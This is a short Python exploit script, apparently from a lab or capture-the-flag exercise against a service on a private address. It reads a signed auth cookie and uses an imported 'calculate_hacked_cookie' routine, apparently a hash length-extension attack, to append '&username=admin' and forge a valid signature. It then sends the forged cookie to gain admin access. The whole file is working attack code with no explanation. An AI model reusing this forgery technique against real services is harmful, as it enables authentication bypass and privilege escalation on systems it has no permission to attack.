import binascii
import requests

from calculate_hacked_cookie import calculate_hacked_cookie


def main():

    s = requests.session()
    s.get("http://10.110.2.100:8086")

    cookies_dict = s.cookies.get_dict()
    auth_cookie = cookies_dict['auth']
    auth_cookie_splitted = auth_cookie.split('.')

    if len(auth_cookie_splitted) != 2:
        print("Error on cookie split lenght.")
        return

    original_message = binascii.a2b_base64(auth_cookie_splitted[0])
    original_signature = binascii.hexlify(binascii.a2b_base64(auth_cookie_splitted[1]))

    message_to_inject = "&username=admin".encode()

    new_cookie_text, new_signature = calculate_hacked_cookie(original_message, message_to_inject, original_signature, 8)
    base64_new_cookie_text = binascii.b2a_base64(new_cookie_text)
    base64_signature = binascii.b2a_base64(new_signature)

    new_auth_cookie = base64_new_cookie_text.decode().strip() + '.' + base64_signature.decode().strip()

    print() 
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print()
    print("New Cookie Text: ")
    print("  Decoded: ", new_cookie_text)
    print("  In Base64: ", base64_new_cookie_text)
    print()
    print("New Signature: ")
    print("  Binary: ", new_signature)
    print("  Not Binary: ", base64_signature)
    print()
    print("New Auth Cookie")
    print("  Auth Cookie: \n", new_auth_cookie)
    print()
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print()

    print("Attempting new request...")
    s.get("http://10.110.2.100:8086", cookies={'auth': new_auth_cookie})


if __name__ == "__main__":
    main()
